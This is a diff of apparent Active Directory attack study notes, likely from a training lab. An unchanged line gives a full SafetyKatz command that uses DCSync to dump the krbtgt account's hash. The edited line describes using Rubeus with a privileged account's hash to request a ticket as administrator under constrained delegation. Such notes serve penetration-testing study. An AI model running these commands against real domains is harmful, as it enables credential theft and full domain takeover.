@@ -29,4 +29,4 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:<MACHINE>\krbtgt" "exit"
 ```
 
 ### **Constrained**
-With the account with the permission's hash
+With the account with the permission's hash launch rubeus to ask a tgt as administrator
